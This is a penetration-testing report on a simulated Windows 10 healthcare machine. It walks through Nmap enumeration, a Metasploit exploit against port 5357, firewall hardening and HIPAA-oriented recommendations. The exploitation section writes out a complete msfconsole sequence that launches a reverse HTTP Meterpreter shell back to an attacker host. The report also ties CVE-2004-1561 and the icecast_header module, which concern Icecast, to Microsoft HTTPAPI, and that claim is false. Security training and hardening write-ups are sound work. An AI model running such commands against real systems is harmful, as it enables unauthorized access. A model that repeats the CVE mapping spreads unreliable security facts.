# VAPT Report on HTTPAPI Services in Windows 10 Healthcare Endpoint

### This report documents a targeted VAPT simulation that exploited Microsoft HTTPAPI via port 5357 to assess system misconfigurations and apply mitigation through service hardening and firewall enforcement.

---

## **🔐 Introduction**

Healthcare infrastructures, often relying on legacy systems and misconfigured services, are increasingly vulnerable to low-effort exploitation. This project simulates an internal red team operation aimed at identifying and exploiting known vulnerabilities in a Windows 10 machine running insecure HTTPAPI-based services through port 5357.

The core of this engagement revolved around discovering the presence of UPnP/SSDP exposure via Microsoft HTTPAPI, mapping the service using Nmap, confirming its version and exploitability, and ultimately weaponizing the vulnerability CVE-2004-1561 using Metasploit. This attack demonstrates how seemingly harmless services—like those used for device discovery—can be leveraged for unauthorized access.

This report also focuses on enforcing system hardening measures by applying firewall rules and disabling insecure ports and services—thus closing the attack surface.

<p align="center">
  <img src="https://github.com/user-attachments/assets/2ec860ca-6629-44ba-9595-f429dfe34e54" alt="VAPT_Cover">
</p>


---

### 🛠️ Tools Used

| Tool                      | Purpose                                                               |
| ------------------------- | --------------------------------------------------------------------- |
| **Nmap**                  | Network scanning and port discovery (e.g., detecting open port 5357)  |
| **Metasploit**            | Exploitation framework used to gain reverse shell access via CVE      |
| **Wireshark**             | (Optional) Packet capture and analysis of HTTPAPI traffic             |
| **Windows Firewall**      | Manual configuration to block/allow HTTPAPI service post-exploitation |
| **CMD/PowerShell**        | Service enumeration, port listing (`netstat`, `sc query`, etc.)       |
| **Draw\.io / Lucidchart** | For network/attack flow diagrams (recommended for visualization)      |
| **Git & GitHub**          | Version control and collaboration on the VAPT project documentation   |

---

# Vulnerability Assessment and Penetration Testing (VAPT) Report

## Target: Windows 10 Host – Healthcare Environment

**Prepared by:** Aditya Bhatt <br/>
**Designation:** VAPT Analyst | Cybersecurity Professional <br/>
**Contact:** [info.adityabhatt3010@gmail.com](mailto:info.adityabhatt3010@gmail.com) | +91-9818993884 <br/>

---

## Executive Summary

This report documents a security assessment of a Windows 10 endpoint within a simulated healthcare environment. The VAPT focused on identifying misconfigured or exposed services—specifically the HTTPAPI httpd 2.0 service running on TCP port 5357, typically associated with SSDP/UPnP protocols.

Through network scanning and service enumeration, the system was found to be vulnerable to CVE-2004-1561—a known flaw in the HTTP header parsing of the Microsoft HTTPAPI. The vulnerability was exploited using Metasploit's `icecast_header` module with a reverse HTTP Meterpreter payload, granting shell access.

The service was later disabled, and custom firewall rules were applied to prevent further exploitation. The system was successfully hardened, verified by a follow-up port scan.

---

## Objectives

* Identify HIPAA compliance requirements as part of baseline regulatory understanding.
* Perform enumeration and vulnerability mapping on a Windows 10 machine.
* Exploit discovered HTTPAPI service using a known CVE.
* Harden the system by disabling insecure services and enforcing firewall rules.

---

## Methodology

### Task 1: HIPAA Requirements Review

Before technical assessment, HIPAA compliance standards were analyzed:

* **Privacy Rule:** Ensures PHI is accessed only with patient consent.
* **Security Rule:** Requires encryption, access controls, and audit mechanisms for ePHI.
* **Breach Notification:** Any breach of unsecured PHI must be reported to HHS.
* **Enforcement Rule & Omnibus Rule:** Defines penalties and extends compliance to third-party vendors.

---

### Task 2: Network & Service Enumeration

1. **Target IP Identification**

   Command:

   ```bash
   ipconfig
   ```

   ![1](https://github.com/user-attachments/assets/71d85add-adde-4f48-a844-6e983b5e7092) <br/>

   Output: IP Address of Windows host – `192.168.178.142`

2. **Live Host Discovery**

   ```bash
   nmap -sn 192.168.178.1/24
   ```

   ![2](https://github.com/user-attachments/assets/f422773b-12b9-4544-a1ce-0e2f8a527b27) <br/>
   ![3](https://github.com/user-attachments/assets/a8b95fcd-60a4-4465-a3d7-d12895d14094) <br/>
   ![4](https://github.com/user-attachments/assets/073e32cf-ad14-4b51-9f14-c8933249837c) <br/>

   Identified active host: `192.168.178.142`

3. **Service Enumeration**

   ```bash
   nmap -sS 192.168.178.142
   nmap -sV -p5357 192.168.178.142
   ```

   ![5](https://github.com/user-attachments/assets/2616873b-82b0-43a9-9986-aa62bd48c40b) <br/>
   ![6](https://github.com/user-attachments/assets/b773eceb-db4a-4188-a8a6-da54731bade0) <br/>

   Detected: HTTPAPI httpd 2.0 on TCP port 5357

---

### Task 3: Vulnerability Exploitation

* **Vulnerability:** CVE-2004-1561
* **Exploit Module:** `exploit/windows/http/icecast_header`
* **Payload:** `windows/meterpreter/reverse_http`

Metasploit Setup:

```bash
msfconsole
use exploit/windows/http/icecast_header
set payload windows/meterpreter/reverse_http
set RHOSTS 192.168.178.142
set RPORT 5357
set LHOST 192.168.178.137
exploit
```
   
![7](https://github.com/user-attachments/assets/4388613c-0fc0-4edc-82d5-13dad263e4b6) <br/>

Post-exploit command:

```bash
sysinfo
```

![8](https://github.com/user-attachments/assets/92b85a87-a109-4b62-90c8-b25fc01bcfcc) <br/>

Outcome: Successfully obtained system details, confirming access via reverse shell.

---

### Task 4: Hardening the Target System

**Steps:**

* Navigate to Windows Firewall → Advanced Settings

  
![9](https://github.com/user-attachments/assets/b7423a21-9630-412c-95ef-1e6625544581) <br/>
![10](https://github.com/user-attachments/assets/dd6a39e8-fc0b-41fc-bd01-e1a1e19bcfaf) <br/>
![11](https://github.com/user-attachments/assets/10e4c256-83c6-4059-a6f4-2ba2f860cb0a) <br/>

* Create custom inbound/outbound rules to block port `5357`

![12](https://github.com/user-attachments/assets/9d1a2025-00a3-4148-b38b-8fb2906accf8) <br/>

* Disable UPnP-related services, if active

![13](https://github.com/user-attachments/assets/60c973fb-74ba-4ed3-8260-5a6d4aeaf3dd) <br/>

---

### Task 5: Post-Hardening Validation

Re-run port scan:

```bash
nmap -sV -p5357 192.168.178.142
```

![14](https://github.com/user-attachments/assets/3afa6e52-9724-43c5-9f5f-b9c4c63bbfda) <br/>

Status: Port is now closed/filtered. No response from HTTPAPI service.

---

## Key Findings

* TCP port 5357 exposed to LAN with vulnerable HTTPAPI service
* Vulnerability exploited successfully using Metasploit
* Legacy protocol (UPnP) remains active on healthcare system endpoints
* No firewall rules or monitoring in place at time of scan

---

## Risk Analysis

| Risk                             | Impact | Likelihood | Risk Level |
| -------------------------------- | ------ | ---------- | ---------- |
| CVE Exploitation on Port 5357    | High   | High       | Critical   |
| Misconfigured UPnP/SSDP Services | High   | Medium     | High       |
| Absence of Endpoint Firewalls    | Medium | High       | High       |
| Unpatched HTTPAPI Library        | High   | Medium     | High       |

---

## Recommendations

### 1. Service Management

* Disable UPnP, SSDP, and HTTPAPI if not required
* Ensure only essential services are running

### 2. Patch Management

* Apply all security patches regularly
* Monitor for CVEs associated with system components

### 3. Firewall Configuration

* Apply deny-all by default
* Allow traffic only to known required ports/services

### 4. Network Segmentation

* Isolate legacy systems or medical endpoints from production networks

### 5. HIPAA Alignment

* Enforce access controls and breach reporting mechanisms
* Audit connected systems for PHI exposure

---

## Conclusion

This assessment confirms that even default Windows services like HTTPAPI can be exploited with well-known CVEs when misconfigured and unpatched. Through Nmap, Metasploit, and proper verification, the attack vector was proven effective, and the mitigation strategy—firewall hardening and service disabling—successfully secured the machine.

This case highlights the critical need for continuous vulnerability monitoring, strict firewall configurations, and minimal exposure of services on internal networks—especially in regulated environments like healthcare.

---

## **🛡️ Final Thoughts**

This VAPT engagement served as a clear demonstration of how overlooked services like HTTPAPI and protocols such as UPnP can open serious attack surfaces within enterprise environments—especially in healthcare, where system uptime often takes precedence over security hygiene.

While the exploitation required minimal effort, mitigation demanded structured firewall policies, service-level auditing, and an understanding of risk beyond what’s visible. In the end, proactive hardening proved to be the most effective defense.

**Security isn't just about fixing vulnerabilities—it’s about building systems that expect to be targeted and are ready to withstand it.**

Thank you for reading. Stay informed. Stay secure.

---
